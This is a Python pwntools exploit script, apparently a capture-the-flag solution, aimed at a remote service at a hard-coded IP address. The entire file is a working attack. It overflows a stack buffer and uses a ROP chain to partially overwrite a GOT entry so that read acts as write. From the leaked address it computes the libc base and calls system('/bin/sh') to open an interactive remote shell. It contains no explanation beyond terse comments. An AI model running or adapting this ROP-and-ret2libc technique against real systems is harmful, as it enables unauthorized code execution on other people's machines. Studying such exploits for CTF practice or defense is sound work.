from pwn import *

while 1:
	try:
		#s = process("./start_hard_c8b452f5aab9a474dcfe1351ec077a601fdf8249")
		s = remote("128.199.152.175", 10001)

		buf =  "A"*0x10
		buf += "B"*8

		#bash read

		#50 0x00000000004005c1 : pop rsi ; pop r15 ; ret
		buf += p64(0x00000000004005c1)
		buf += p64(0x601018)
		buf += "C"*8

		buf += p64(0x400400)

		buf += p64(0x4005c3)
		buf += p64(1)

		buf += p64(0x400400)

		#pop rbp, ret
		buf += p64(0x0000000000400490)
		buf += p64(0x601018+0x20-7)

		#50 0x00000000004005c1 : pop rsi ; pop r15 ; ret
		buf += p64(0x00000000004005c1)
		buf += "A"*7+p8(0x70)
		buf += "C"*8

		#now we reset read
		buf += p64(0x400531)

		buf += p64(0x00000000004005c1)
		buf += p64(0x601010)
		buf += "C"*8

		buf += "D"*8

		s.send(buf)
		s.clean()
		#s.send(p32(0x1a56c4)[:3])

		#make read = write
		s.send(p8(0xd0))

		buf = s.recv(0x400)
		write = u64(buf[:8])

		libc = ELF("./libc.so")
		libc.address = write-libc.symbols['write']
		print hex(libc.symbols['system'])

		rop2 = "/bin/sh\x00"
		rop2 += "A"*0x10

		rop2 += p64(0x4005c3)
		rop2 += p64(0x601021)

		#make room for system to exec
		ropnop = p64(0x400551)
		rop2 += ropnop*(0x60)

		rop2 += p64(libc.symbols['system'])

		s.send(rop2)

		s.interactive()
		break
	except EOFError:
		break
		pass
